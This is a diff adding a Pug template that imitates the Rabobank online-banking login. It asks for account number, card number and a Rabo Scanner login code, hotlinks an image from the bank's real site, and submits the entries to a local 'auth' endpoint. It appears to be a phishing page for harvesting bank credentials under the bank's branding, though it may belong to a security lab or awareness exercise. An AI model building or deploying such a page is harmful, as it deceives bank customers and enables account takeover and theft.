@@ -1,0 +1,33 @@
+html
+  include includes/head.pug
+  head
+  body
+.container.py-5.w-50
+  form(method='get' action='auth')
+    .row
+        .form-row
+        .form-group.col-md-6.pb-5
+          label(for='InputAccount') Account number
+          input#InputAccount.form-control(type='text' name='InputAccount' placeholder='NL • • RABO 0')
+        .form-group.col-md-6
+          label(for='inputCard') Card number
+          input#inputCard.form-control(type='text' placeholder='')
+
+        .col.md-6.d-flex.align-self-center.flex-column
+          ul.text-muted.justify-content-center
+            li Insert your card into the Rabo Scanner
+            li Enter your PIN
+            li Scan the color code
+            li Verify the summary on the Rabo Scanner
+        .col.md-6
+          img(src='https://bankieren.rabobank.nl/s-t-a-t-i-c/msp/authentication/v1/rabo/sam/staticcontent/vrs_2130576/newdesign/images/grayed-out-vc-en.png')
+
+        .form-row
+        .form-group.col-md-6
+          label(for='Logincode') Login code
+          input#Logincode.form-control(type='text' placeholder='')
+
+        .form-group.col-md-6
+          input.btn.btn-primary.mt-4.w-100(type='submit' value='Log in')
+        
+  
